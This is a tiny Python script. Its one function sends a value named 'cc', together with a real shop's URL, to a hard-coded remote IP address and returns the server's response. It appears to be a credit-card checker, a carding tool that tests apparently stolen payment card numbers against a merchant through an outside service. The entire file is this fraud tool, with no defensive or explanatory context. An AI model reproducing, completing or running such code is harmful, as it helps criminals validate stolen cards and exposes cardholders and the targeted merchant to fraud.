import requests
def chkk(ccx):
	cc=ccx.strip()
	urll="https://dominileather.com"
	res=requests.get(f'http://151.247.197.54:5000/tome?cc={cc}&url={urll}').text
	return res
